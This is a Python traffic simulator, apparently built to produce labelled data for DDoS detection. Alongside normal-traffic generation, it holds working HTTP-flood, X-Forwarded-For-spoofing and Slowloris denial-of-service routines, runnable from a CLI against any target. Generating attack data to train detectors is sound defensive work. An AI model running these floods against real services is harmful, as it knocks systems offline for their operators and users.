"""HTTP traffic generator (normal + attack modes)."""
# TODO: implement using requests / aiohttp
"""
simulator/traffic_generator.py

Generates HTTP traffic against a target — normal or attack mode.

Usage (as library):
    from simulator.traffic_generator import TrafficGenerator

    gen = TrafficGenerator(target="http://192.168.100.10/")
    gen.run_normal(duration=30, rps=5)
    gen.run_http_flood(duration=30, threads=50)

Usage (CLI):
    python -m simulator.traffic_generator --target http://192.168.100.10/ \
        --mode normal --duration 30 --rps 5
"""
from __future__ import annotations

import argparse
import json
import random
import socket
import threading
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Literal

import requests
from requests.adapters import HTTPAdapter

from core.logging import get_logger

log = get_logger("simulator.traffic_generator")

Mode = Literal["normal", "http_flood", "slowloris", "spoofed"]

# Where labels go — matched to your scaffold
LABEL_DIR = Path("data/labeled")


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class TrafficLabel:
    """Ground-truth label emitted alongside generated traffic."""
    ts_start: float
    ts_end: float
    mode: str
    target: str
    source_ip: str          # "spoofed" if rotated, else real client IP
    requests: int
    threads: int
    rps_target: float
    note: str = ""


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def random_ip() -> str:
    """Random public-looking IPv4 (for X-Forwarded-For spoofing)."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def real_source_ip(target: str) -> str:
    """Best-effort local IP used to reach the target."""
    try:
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def make_session(pool: int = 100) -> requests.Session:
    """Session with a large connection pool."""
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=pool, pool_maxsize=pool, max_retries=0)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def write_label(label: TrafficLabel) -> None:
    LABEL_DIR.mkdir(parents=True, exist_ok=True)
    out = LABEL_DIR / "labels.jsonl"
    with out.open("a") as f:
        f.write(json.dumps(asdict(label)) + "\n")
    log.info(f"label written mode={label.mode} reqs={label.requests} ip={label.source_ip}")


# ---------------------------------------------------------------------------
# Traffic Generator
# ---------------------------------------------------------------------------

class TrafficGenerator:
    def __init__(
        self,
        target: str,
        timeout: float = 3.0,
        user_agents: list[str] | None = None,
        paths: list[str] | None = None,
    ) -> None:
        self.target = target.rstrip("/") + "/"
        self.timeout = timeout
        self.user_agents = user_agents or [
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "curl/8.4.0",
            "python-requests/2.31.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        ]
        self.paths = paths or ["/", "/index.html", "/api/data", "/health"]

        # counters (thread-safe with lock)
        self._lock = threading.Lock()
        self._sent = 0
        self._errors = 0
        self._stop = threading.Event()

    # ------------------------------------------------------------------
    # counters
    # ------------------------------------------------------------------
    def _inc(self, ok: bool) -> None:
        with self._lock:
            self._sent += 1
            if not ok:
                self._errors += 1

    def snapshot(self) -> tuple[int, int]:
        with self._lock:
            return self._sent, self._errors

    def reset(self) -> None:
        with self._lock:
            self._sent = 0
            self._errors = 0

    # ------------------------------------------------------------------
    # normal traffic
    # ------------------------------------------------------------------
    def run_normal(self, duration: int = 30, rps: float = 5.0,
                   jitter: float = 0.3) -> TrafficLabel:
        """
        Realistic user traffic: a fixed request rate with jitter,
        rotating paths + user-agents.
        """
        log.info(f"[normal] target={self.target} rps={rps} dur={duration}s")
        self.reset()
        self._stop.clear()

        start = time.time()
        interval = 1.0 / max(rps, 0.001)

        session = make_session()
        while not self._stop.is_set() and (time.time() - start) < duration:
            try:
                path = random.choice(self.paths)
                headers = {"User-Agent": random.choice(self.user_agents)}
                r = session.get(self.target + path.lstrip("/"),
                                headers=headers, timeout=self.timeout)
                self._inc(r.status_code < 500)
            except Exception:
                self._inc(False)

            # jittered sleep
            time.sleep(interval * (1 + random.uniform(-jitter, jitter)))

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="normal", target=self.target,
            source_ip=real_source_ip(self.target),
            requests=sent, threads=1, rps_target=rps,
            note=f"errors={errs}",
        )
        write_label(label)
        return label

    # ------------------------------------------------------------------
    # HTTP flood (L7 — volumetric)
    # ------------------------------------------------------------------
    def run_http_flood(self, duration: int = 30, threads: int = 50,
                       spoof_xff: bool = False) -> TrafficLabel:
        """
        Volumetric HTTP flood. Optionally rotates X-Forwarded-For
        to simulate IP cloaking at the proxy layer.
        """
        log.info(f"[http_flood] threads={threads} dur={duration}s spoof_xff={spoof_xff}")
        self.reset()
        self._stop.clear()

        start = time.time()

        def worker(tid: int) -> None:
            session = make_session(pool=10)
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    headers = {"User-Agent": random.choice(self.user_agents)}
                    if spoof_xff:
                        headers["X-Forwarded-For"] = random_ip()
                    r = session.get(self.target, headers=headers, timeout=self.timeout)
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        workers = [threading.Thread(target=worker, args=(i,), daemon=True)
                   for i in range(threads)]
        for w in workers:
            w.start()
        for w in workers:
            w.join(timeout=duration + 5)

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="http_flood", target=self.target,
            source_ip="spoofed" if spoof_xff else real_source_ip(self.target),
            requests=sent, threads=threads, rps_target=0.0,
            note=f"errors={errs} spoof_xff={spoof_xff}",
        )
        write_label(label)
        return label

    # ------------------------------------------------------------------
    # Slowloris (L7 — low and slow)
    # ------------------------------------------------------------------
    def run_slowloris(self, duration: int = 60, connections: int = 200,
                      keepalive: float = 10.0) -> TrafficLabel:
        """
        Opens many sockets, sends partial HTTP headers, keeps them open.
        Low bandwidth — evades rate limiting but exhausts connection tables.
        """
        log.info(f"[slowloris] conns={connections} dur={duration}s")
        self.reset()
        self._stop.clear()

        host = self.target.split("//")[-1].split("/")[0]
        if ":" in host:
            hostname, port = host.split(":")
            port = int(port)
        else:
            hostname, port = host, 80

        start = time.time()
        sockets: list[socket.socket] = []

        def open_conn() -> socket.socket | None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((hostname, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + hostname.encode() + b"\r\n")
                s.send(b"User-Agent: slowloris/1.0\r\n")
                self._inc(True)
                return s
            except Exception:
                self._inc(False)
                return None

        # open connections
        for _ in range(connections):
            s = open_conn()
            if s:
                sockets.append(s)

        # keep them alive with partial headers
        while not self._stop.is_set() and (time.time() - start) < duration:
            for s in list(sockets):
                try:
                    s.send(b"X-Pad: " + b"a" * 10 + b"\r\n")
                    self._inc(True)
                except Exception:
                    self._inc(False)
                    sockets.remove(s)
                    # try to replace
                    ns = open_conn()
                    if ns:
                        sockets.append(ns)
            time.sleep(keepalive)

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="slowloris", target=self.target,
            source_ip=real_source_ip(self.target),
            requests=sent, threads=len(sockets), rps_target=0.0,
            note=f"errors={errs} keepalive={keepalive}s",
        )
        write_label(label)
        return label

    # ------------------------------------------------------------------
    # stop hook (for Ctrl-C)
    # ------------------------------------------------------------------
    def stop(self) -> None:
        self._stop.set()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="HTTP traffic simulator (normal + attacks)")
    p.add_argument("--target", required=True, help="e.g. http://192.168.100.10/")
    p.add_argument("--mode", required=True,
                   choices=["normal", "http_flood", "slowloris", "spoofed"])
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--rps", type=float, default=5.0, help="for normal mode")
    p.add_argument("--threads", type=int, default=50, help="for http_flood")
    p.add_argument("--connections", type=int, default=200, help="for slowloris")
    p.add_argument("--keepalive", type=float, default=10.0, help="for slowloris")
    return p.parse_args()


def main() -> int:
    args = _parse_args()
    gen = TrafficGenerator(target=args.target)

    try:
        if args.mode == "normal":
            gen.run_normal(duration=args.duration, rps=args.rps)
        elif args.mode == "http_flood":
            gen.run_http_flood(duration=args.duration, threads=args.threads)
        elif args.mode == "spoofed":
            gen.run_http_flood(duration=args.duration, threads=args.threads,
                               spoof_xff=True)
        elif args.mode == "slowloris":
            gen.run_slowloris(duration=args.duration,
                              connections=args.connections,
                              keepalive=args.keepalive)
    except KeyboardInterrupt:
        log.info("interrupted by user")
        gen.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())